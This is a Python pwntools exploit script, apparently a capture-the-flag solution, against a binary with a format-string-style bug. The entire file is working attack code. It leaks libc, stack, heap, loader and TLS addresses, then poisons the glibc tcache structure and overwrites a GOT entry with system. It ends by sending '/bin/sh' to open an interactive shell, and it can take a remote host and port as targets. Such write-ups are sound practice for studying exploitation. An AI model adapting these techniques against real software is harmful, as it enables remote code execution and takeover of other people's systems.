from pwn import *
import sys
import ctypes

context.terminal = ['tmux', 'splitw', '-h']
elf = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
def exp():
    elf.address = 0
    libc.address = 0
    ld.address = 0

    if len(sys.argv) != 1:
        con = remote(sys.argv[1], sys.argv[2])
    else:
        con = process('./main_patched')
    LIBC_OFF = 521
    STACK_OFF = 520
    ELF_OFF = 525


    con.sendlineafter(b'> ', f'!${LIBC_OFF}p_!${STACK_OFF}p_!${ELF_OFF}p'.encode())
    libc_leak, stack_leak, elf_leak = con.recvline().split(b'_')
    libc_leak, stack_leak, elf_leak = int(libc_leak, 16), int(stack_leak, 16), int(elf_leak, 16)
    info("Leaks %s %s %s", hex(libc_leak), hex(stack_leak), hex(elf_leak))

    libc.address = libc_leak - (libc.symbols['__libc_start_call_main'] + 120)
    elf.address = elf_leak - elf.symbols['main']

    payload = f"!${LIBC_OFF}+{libc.symbols['main_arena']+96 - libc_leak}p_!${LIBC_OFF}+{libc.got['_dl_signal_error'] - libc_leak}p".encode()
    con.sendlineafter(b'> ', payload)
    heap_leak, ld_leak = con.recvline().split(b'_')
    heap_leak, ld_leak = int(heap_leak, 16), int(ld_leak, 16)
    heap_base = heap_leak - 0xa00
    ld.address = ld_leak - ld.symbols['_dl_signal_error']
    tls_ptr = ld.address + 0x7f5e628330c8 - 0x7f5e627f8000

    payload = f"!${LIBC_OFF}+{tls_ptr - ld_leak}+{libc.got['_dl_signal_error'] - libc_leak}p".encode()
    con.sendlineafter(b'> ', payload)
    tls_leak = int(con.recvline(), 16)
    fs_base = tls_leak + 0x740 - 0xa00
    tcache_ptr = fs_base + 0x700 - 0x740

    # payload = f'!$41+{libc.symbols['tcache_key'] - libc_leak}p'.encode()
    # con.sendlineafter(b'> ', payload)
    # tcache_key = int(con.recvline(), 16)
    # info("\ttcache_key: %s", hex(tcache_key))

    TCACHE_SMALL_BINS = 64
    MALLOC_ALIGNMENT = 0x10
    MIN_CHUNK_SIZE = 0x20


    def tidx2size(idx: int) -> int:
        return idx * MALLOC_ALIGNMENT + MIN_CHUNK_SIZE


    def tcache_perthread_struct_to_buffer(entries={}) -> bytes:
        ret = b''
        for i in range(1, TCACHE_SMALL_BINS + 1):
            sz = tidx2size(i)
            llen = 1 if sz in entries else 0
            ret += p16(llen)
        for i in range(1, TCACHE_SMALL_BINS + 1):
            sz = tidx2size(i)
            ret += p64(entries.get(sz, 0))
        return ret

    VIC_SZ = 0x30

    tcache_data = tcache_perthread_struct_to_buffer({VIC_SZ: elf.got['__isoc23_strtoimax']})

    def buffer_to_fmt(data):
        ch_to_fmt = {
            0: b'!$5c',
            ord('!'): b'!!',
        }
        ret = b''
        for c in data:
            ret += ch_to_fmt.get(c, bytes([c]))
        return ret

    overflow_arg_ptr = 0x00007ffe112cde00 - 0x7ffe112ceeb0 + stack_leak

    def addr_to_pos(addr):
        assert addr % 8 == 0
        return (addr - overflow_arg_ptr + 0x30) // 8

    BITS = 31

    if not (-2 ** BITS <= addr_to_pos(tcache_ptr) <= 2 ** BITS):
        info("Fail! Offset is %s", hex(addr_to_pos(tcache_ptr)))
        #con.terminate()
        con.close()
        return False

    info("\tlibc: %s", hex(libc.address))
    info("\telf: %s", hex(elf.address))
    info("\theap: %s", hex(heap_base))
    info("\tld: %s", hex(ld.address))
    info("\tfs ptr: %s", hex(tls_ptr))
    info("\tfs leak: %s", hex(tls_leak))
    info("\tfs base: %s", hex(fs_base))
    info("\ttcache ptr: %s", hex(tcache_ptr))
    info("\tOverflow ptr: %s", hex(overflow_arg_ptr))

    
    info("Success! Offset is %s", hex(addr_to_pos(tcache_ptr)))

    # Overwrite tcache and replace it with our own poisoned tcache struct
    payload = b''
    payload += buffer_to_fmt(tcache_data)
    payload += f'!${addr_to_pos(tcache_ptr)}n'.encode()
    con.sendlineafter(b'> ', payload)
    con.recvline()

    # Overwrite GOT by having malloc return strtoimax GOT and write system to it.
    got = b''
    got += p64(libc.symbols['system']) # __isoc23_strtoimax
    got += p64(libc.symbols['fclose']) # fclose

    payload = b''
    payload += buffer_to_fmt(got)
    payload += f'!${addr_to_pos(tcache_ptr-0x20)}n'.encode()
    con.sendlineafter(b'> ', payload)
    con.recvline()

    # Send "$/bin/sh" and win
    con.sendlineafter(b'> ', b'!$/bin/sh')

    con.interactive()
    return True

while not exp():
    pass